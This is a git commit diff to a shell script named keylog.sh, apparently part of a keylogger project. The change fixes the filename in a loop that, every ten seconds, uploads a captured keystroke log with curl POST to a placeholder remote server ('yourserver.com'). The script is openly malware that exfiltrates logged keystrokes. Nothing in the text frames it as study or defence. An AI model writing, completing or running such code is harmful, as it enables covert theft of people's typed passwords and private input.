2c3f5cb30dd51c2c322381f919c485da14a59934
ᥴ̶̧̪̤̓͊̌̽̊̎̓͜͝͠ꪮ̵͈̀͐͗͒̽͛͊͝ꪀ̸̧̨̺̮̩̣̤͂̾͜ᦓ̵̠̂̅̈́̊ͅꪮ̶̢͇̟͆͗͆́̌͗͂͒̀͜͝ꪶ̴̨̧̖͍̞̲̖̠̆̽̈́̇̾̍̒̕͠ͅꫀ̵̡̨̧̛͚͕̝̭̦̩̻̈́̚̚ͅ <162306504+cons0le7@users.noreply.github.com>
2024-10-20 23:53:07 +0000

    Add files via upload

--- keylog.sh
+++ keylog.sh
@@ -6,7 +6,7 @@ upload_logs() {
     while true; do
         sleep 10 # Uploads logs every 10 seconds. Adjust as needed.
         if [ -f ./logs.txt ]; then
-            curl -X POST -F "file=@./logger.txt" "http://yourserver.com/upload" # Replace with your server URL
+            curl -X POST -F "file=@./logs.txt" "http://yourserver.com/upload" # Replace with your server URL
         fi
     done
 }
